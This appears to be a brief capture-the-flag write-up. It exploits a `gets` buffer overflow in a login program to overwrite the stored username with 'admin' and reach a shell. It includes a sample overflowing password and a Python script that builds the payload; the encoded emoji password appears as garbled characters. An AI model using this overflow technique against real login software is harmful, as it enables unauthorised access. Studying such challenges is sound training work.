Reading the code, easy to see that :

This `gets` function can cause buffer overflow to exploit.

It's only read 32 bytes and jump to the next address. So with that idea, i would try to put the payload to password field.  
```
Username: guest
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAadmin
```
The notification said, i logged as `admin` successfully but wrong password. So here is admin's password:

As you can see, it's not ASCII text but emoji. That mean we can not write it normaly. So we need to encode it to utf-8. 
I wrote a python scripts to inject the payload:
```
# {admin_password}{\x00}{padding}{admin_username}{\x00}
import sys
payload = "ðŸ‡¦ðŸ‡©ðŸ‡²ðŸ‡®ðŸ‡³".encode('utf-8') + b"\x00"
payload += b"A" * (32 - len("ðŸ‡¦ðŸ‡©ðŸ‡²ðŸ‡®ðŸ‡³".encode('utf-8') + b"\x00"))
payload += b"admin\x00"
sys.stdout.buffer.write(b"guest\n")          
sys.stdout.buffer.write(payload + b"\n")
```

In my first payload, it's still login as `admin` but cann't jump back to username. That why with the new payload, i put the correct password first then buffer overflow, made it jump back to username with `admin`. 
Successfully entering the shell, our job is find the flag was hidden with some OS Command.  
Peace!
